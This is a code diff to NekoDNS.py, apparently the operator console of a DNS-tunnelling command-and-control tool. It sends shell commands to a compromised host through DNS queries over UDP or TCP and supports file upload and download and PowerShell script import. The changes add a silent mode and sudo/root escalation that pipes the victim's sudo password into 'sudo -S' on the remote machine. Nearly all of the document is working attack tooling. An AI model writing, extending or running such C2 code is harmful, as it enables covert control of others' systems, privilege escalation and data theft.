@@ -18,6 +18,7 @@ import shlex as oslex
 from neotermcolor import colored
 
 responses = {}
+silent = False
 whoami_raw = None
 lock = threading.Lock()
 upload_started = False
@@ -106,6 +107,11 @@ class DNSHandler(socketserver.BaseRequestHandler):
                     break
                 length = data[i]
             return '.'.join(qname)
+
+        except KeyboardInterrupt:
+            print (colored("\n[!] Exiting..\n", "red"))
+            exit(0)
+
         except Exception as e:
             print(colored(f"[!] Error extracting UDP query: {str(e)}", "red"))
             return ""
@@ -235,6 +241,11 @@ class TCPHandler(socketserver.BaseRequestHandler):
             domain = self.extract_query_tcp(received_data)
             response = self.build_response_tcp(received_data, domain)
             self.request.sendall(response)
+
+        except KeyboardInterrupt:
+            print (colored("\n[!] Exiting..\n", "red"))
+            exit(0)
+
         except Exception as e:
             print(colored(f"[!] TCP Handler Error: {str(e)}", "red"))
 
@@ -259,6 +270,7 @@ class TCPHandler(socketserver.BaseRequestHandler):
                     break
                 length = data[i]
             return '.'.join(qname)
+
         except Exception as e:
             print(colored(f"[!] Error extracting TCP query: {str(e)}", "red"))
             return ""
@@ -363,7 +375,7 @@ def clean_whoami(raw):
         return raw.split('\\')[1].lower()
     return raw.lower()
 
-def get_custom_prompt():
+def get_custom_prompt(root):
     try:
         global whoami_raw
         whoami = REMOTE_INFO.get("whoami", "user")
@@ -386,6 +398,9 @@ def get_custom_prompt():
             if "\\" in whoami_raw:
                 hostname = whoami_raw.split("\\")[0].strip()
 
+        if root:
+            whoami = "root"
+
         if whoami and hostname:
             cinput = colored(" [NekoDNS] ", "grey", "on_green") + colored(" ", "green", "on_blue")
             cinput += colored(f"{whoami}@{hostname} ", "grey", "on_blue")
@@ -403,6 +418,7 @@ def prompt_loop():
     global active_command
     global REMOTE_INFO
     global whoami_raw
+    global silent
     upload_started = False
     root = False
     sudo = False
@@ -443,7 +459,7 @@ def prompt_loop():
 
         while True:
             try:
-                command = input(get_custom_prompt()).strip()
+                command = input(get_custom_prompt(root)).strip()
                 if command == "" or command == None or not command:
                     print("\n")
 
@@ -483,28 +499,25 @@ def prompt_loop():
                             current_path += slash
                         REMOTE_INFO["pwd"] = current_path + new_path.rstrip(slash)
 
+                    if root:
+                        cd_command = f"sudo {command}"
+                    else:
+                        cd_command = command
+
                     with lock:
-                        active_command = {'cmd': command, 'delivered': False}
+                        active_command = {'cmd': cd_command, 'delivered': False}
                     try:
                         RESPONSE_QUEUE.get(timeout=1)
                     except:
                         pass
-                    command = None
-
-                    with lock:
-                        active_command = {'cmd': command, 'delivered': False}
-                    try:
-                        RESPONSE_QUEUE.get(timeout=0)
-                    except:
-                        command = None
-                        pass
-                    command = None
 
                 else:
                     if command == "exit":
                         if root:
-                            whoami = old_user
-                            root = False ; command = None
+                            print("\n")
+                            REMOTE_INFO['whoami'] = old_user
+                            root = False
+                            command = None
                         else:
                             command = "exit2"
 
@@ -515,8 +528,8 @@ def prompt_loop():
                         os.system("clear")
                         command = None
 
-                    if "sudo" in command.split()[0]:
-                        if not ":" in path:
+                    if command and command.split()[0] == "sudo":
+                        if not ":" in pwd_cmd:
                             args = oslex.split(command)
                             if len(args) < 2:
                                 print(colored("[!] Usage: sudo \"command\" or sudo su\n","red"))
@@ -524,19 +537,41 @@ def prompt_loop():
                             else:
                                 if not sudo:
                                     old_cmd = ' '.join(args[1:])
-                                    print (colored(f"[sudo] password for {str(whoami).rstrip()}:\n","red"))
-                                    sudo_pass = pwinput.pwinput(prompt=(get_custom_prompt()))
-                                    command = str("printf '" + sudo_pass + "'" + " | " + "sudo -S " + old_cmd)
-                                    wait_for_cmd = True ; sudo = True
+                                    print(colored(f"[sudo] password for {str(whoami).rstrip()}:\n\n","red"))
+                                    if not silent:
+                                        sudo_password = pwinput.pwinput(prompt=(get_custom_prompt(root)))
+                                    else:
+                                        sudo_password = input(get_custom_prompt(root)).strip()
+                                    
                                     if "su" in args:
-                                        command = str("printf '" + sudo_pass + "'" + " | " + "sudo -S printf 'NekoDNSnull'")
+                                        print("\n")
+                                        command = f"echo '{sudo_password}' | sudo -S su -c 'whoami'"
+                                        old_user = REMOTE_INFO['whoami']
+                                        command = None
                                         root = True
+                                        sudo = True
+                                    else:
+                                        command = f"echo '{sudo_password}' | sudo -S {old_cmd}"
+                                        sudo = True
                                 else:
                                     old_cmd = ' '.join(args[1:])
-                                    command = str("printf 'NekoDNSnull'" + " | " + "sudo -S " + old_cmd)
                                     if "su" in args:
-                                        command = str("printf 'NekoDNSnull'" + " | " + "sudo -S printf 'NekoDNSnull'")
+                                        print("\n")
+                                        command = f"echo '{sudo_password}' | sudo -S su -c 'whoami'"
+                                        old_user = REMOTE_INFO['whoami']
+                                        command = None
                                         root = True
+                                    else:
+                                        command = f"echo '{sudo_password}' | sudo -S {old_cmd}"
+
+                                if root and "whoami" in command.lower() and cmd_response.strip().lower() == "root":
+                                    command = None
+
+                    elif root and command and command not in ["exit", "clear", "cls", "kill", "help"] and not command.startswith("upload") and not command.startswith("download") and not command.startswith("import-ps1"):
+                        if sudo_password:
+                            command = f"echo '{sudo_password}' | sudo -S {command}"
+                        else:
+                            command = f"sudo {command}"
 
                     if "upload" in command.split()[0]:
                         args = oslex.split(command)
@@ -562,7 +597,7 @@ def prompt_loop():
                                 with lock:
                                     command_to_client = "upload " + args[1] + "!" + args[2]
                                     active_command = {'cmd': command_to_client, 'delivered': False}
-                                    print(colored(f"[>] Uploading {local_path} in {remote_path}..","magenta"))
+                                    print(colored(f"[>] Uploading \"{local_path}\" in \"{remote_path}\"..","magenta"))
                                     
                                 try:
                                     cmd_response = RESPONSE_QUEUE.get(timeout=360)                                
@@ -579,7 +614,7 @@ def prompt_loop():
                                         active_command['upload_in_progress'] = False
 
                                 except:
-                                    print(colored(f"[+] File uploaded sucessfully to {remote_path}", "green"))
+                                    print(colored(f"[+] File uploaded sucessfully to \"{remote_path}\"", "green"))
                                     pass
 
                             except FileNotFoundError:
@@ -595,7 +630,7 @@ def prompt_loop():
                             remote_path = args[1]
                             local_path = args[2]
                             command = "download " + args[1] + "!" + args[2]
-                            print(colored(f"[>] Downloading {remote_path} in {local_path}..","magenta"))
+                            print(colored(f"[>] Downloading \"{remote_path}\" in \"{local_path}\"..","magenta"))
                             
                     if "import-ps1" in command.split()[0]:
                         args = oslex.split(command)
@@ -621,7 +656,7 @@ def prompt_loop():
                                 with lock:
                                     command_to_client = "import-ps1 " + filename
                                     active_command = {'cmd': command_to_client, 'delivered': False}
-                                    print(colored(f"[>] Importing PowerShell script {filename}..","magenta"))
+                                    print(colored(f"[>] Importing PowerShell script \"{filename}\"..","magenta"))
                             
                                 try:
                                     cmd_response = RESPONSE_QUEUE.get(timeout=360)
@@ -640,10 +675,10 @@ def prompt_loop():
                                     if final_response.strip():
                                         print(colored(final_response.strip(), "green"))
                                     else:
-                                        print(colored(f"[+] PowerShell script {filename} imported successfully!\n\n", "green"))
+                                        print(colored(f"[+] PowerShell script \"{filename}\" imported successfully!\n\n", "green"))
 
                                 except:
-                                    print(colored(f"[+] PowerShell script {filename} imported successfully!\n\n", "green"))
+                                    print(colored(f"[+] PowerShell script \"{filename}\" imported successfully!\n\n", "green"))
                                     pass
 
                                 command = None
@@ -660,6 +695,7 @@ def prompt_loop():
                         print(colored("    upload: Upload a file from local to remote computer","blue"))
                         print(colored("    download: Download a file from remote to local computer","blue"))
                         print(colored("    import-ps1: Import PowerShell script on Windows hosts","blue"))
+                        print(colored("    sudo: Execute with sudo privileges on Linux hosts","blue"))                        
                         print(colored("    clear/cls: Clear terminal screen","blue"))
                         print(colored("    kill: Kill client connection","blue"))
                         print(colored("    exit: Exit from program\n","blue"))
@@ -677,7 +713,7 @@ def prompt_loop():
                         if command == "exit":
                             print (colored("[!] Exiting..\n", "red"))
                             try:
-                                cmd_response = RESPONSE_QUEUE.get(timeout=3)
+                                cmd_response = RESPONSE_QUEUE.get(timeout=30)
                                 break
                                 exit(0)    
                             except:
@@ -709,10 +745,13 @@ def prompt_loop():
 
 if __name__ == "__main__":
     try:
-        print (colored(banner, "blue"))
-        print (colored(banner2, "green"))
+        if not "-silent" in argv:
+            print (colored(banner, "blue"))
+            print (colored(banner2, "green"))
+        else:
+            silent = True
 
-        if len(argv) < 4 or (argv[3] != "-udp" and argv[3] != "-tcp"):
+        if len(argv) < 4 or argv[1] in ["-h", "--help"]:
             print(colored("[!] Usage: python3 NekoDNS.py <listen_ip> <listen_port> <-udp/-tcp>\n", "red"))
             exit(1)
 
@@ -723,15 +762,14 @@ if __name__ == "__main__":
 
         if protocol == "-udp":
             protocol_name = "UDP"
-            server = ThreadedUDPServer((listen_ip, int(listen_port)), DNSHandler)
-            if not "-silent" in argv:
-                print(colored(f"[>] Waiting for connection on {listen_ip}:{listen_port} over {protocol_name}..\n", "yellow"))
+            server = ThreadedUDPServer((listen_ip, 53), DNSHandler)
+
         elif protocol == "-tcp":
             protocol_name = "TCP"
-            server = ThreadedTCPServer((listen_ip, int(listen_port)), TCPHandler)
-            if not "-silent" in argv:
-                print(colored(f"[>] Waiting for connection on {listen_ip}:{listen_port} over {protocol_name}..\n", "yellow"))
-
+            server = ThreadedTCPServer((listen_ip, 53), TCPHandler)
+        
+        if not "-silent" in argv:
+            print(colored(f"[>] Waiting for connection on {listen_ip}:{listen_port} over {protocol_name}..\n", "yellow"))
         threading.Thread(target=server.serve_forever, daemon=True).start()
         prompt_loop()
 
